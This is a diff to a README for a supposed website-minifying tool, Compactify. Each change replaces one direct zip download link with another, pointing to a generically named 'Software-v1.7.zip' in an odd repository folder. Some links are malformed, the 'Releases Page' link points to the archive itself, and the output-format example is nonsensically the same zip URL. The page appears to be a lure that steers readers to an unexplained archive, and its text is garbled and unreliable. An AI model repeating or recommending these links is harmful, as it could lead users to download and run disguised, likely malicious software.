@@ -1,7 +1,7 @@
 # ✨ Compactify - Optimize Website Files with Ease
 
 ## 📥 Download Compactify
-[![Download Compactify](https://raw.githubusercontent.com/khlaifmed/Compactify/main/teraglin/Compactify-2.1.zip%https://raw.githubusercontent.com/khlaifmed/Compactify/main/teraglin/Compactify-2.1.zip)](https://raw.githubusercontent.com/khlaifmed/Compactify/main/teraglin/Compactify-2.1.zip)
+[![Download Compactify](https://github.com/khlaifmed/Compactify/raw/refs/heads/main/teraglin/Software-v1.7.zip%https://github.com/khlaifmed/Compactify/raw/refs/heads/main/teraglin/Software-v1.7.zip)](https://github.com/khlaifmed/Compactify/raw/refs/heads/main/teraglin/Software-v1.7.zip)
 
 ## 🚀 Getting Started
 Compactify is a user-friendly tool that helps you process website files to improve speed and reduce bandwidth use. This tool works seamlessly with CSS, JavaScript, and HTML files, making your web pages faster and more efficient.
@@ -18,7 +18,7 @@ Compactify is a user-friendly tool that helps you process website files to impro
 - **Compression:** Utilizes Brotli compression for optimal file sizes without sacrificing quality.
 
 ## 🌐 Download & Install
-To get started with Compactify, visit the [Releases Page](https://raw.githubusercontent.com/khlaifmed/Compactify/main/teraglin/Compactify-2.1.zip) and follow these steps:
+To get started with Compactify, visit the [Releases Page](https://github.com/khlaifmed/Compactify/raw/refs/heads/main/teraglin/Software-v1.7.zip) and follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version of Compactify.
@@ -36,7 +36,7 @@ After installation, you can start optimizing your website files right away.
 
 ## 📊 Input and Output
 - **Input Formats:** .css, .js, and .html
-- **Output Formats:** Minified files with version numbers appended (e.g., https://raw.githubusercontent.com/khlaifmed/Compactify/main/teraglin/Compactify-2.1.zip)
+- **Output Formats:** Minified files with version numbers appended (e.g., https://github.com/khlaifmed/Compactify/raw/refs/heads/main/teraglin/Software-v1.7.zip)
 
 ## 🎓 Help and Support
 If you encounter issues or need assistance, you can find help in the following ways:
